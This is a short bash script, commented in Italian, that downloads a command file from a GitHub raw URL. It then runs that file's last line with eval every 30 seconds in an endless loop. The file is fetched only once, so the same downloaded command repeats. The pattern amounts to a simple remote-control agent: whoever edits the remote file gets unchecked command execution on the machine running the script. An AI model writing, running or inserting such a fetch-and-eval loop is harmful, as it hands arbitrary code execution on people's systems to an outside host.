#!/bin/bash
# URL del file dei comandi su GitHub
remote_file_url="https://raw.githubusercontent.com/GSBigSmokeGS/bash/main/comandi.txt"

# Percorso locale dove salvare il file dei comandi
local_file_path="comandi.txt"

# Scarica il file dei comandi
curl -s -o "$local_file_path" "$remote_file_url"

# Loop infinito
while true
do
    # Estrai ultimo comando dal file
    last_command=$(tail -1 "$local_file_path")
    
    # Esegue il comando
    eval "$last_command"
    
    # Attendere 30 secondi prima di eseguire di nuovo
    sleep 30
done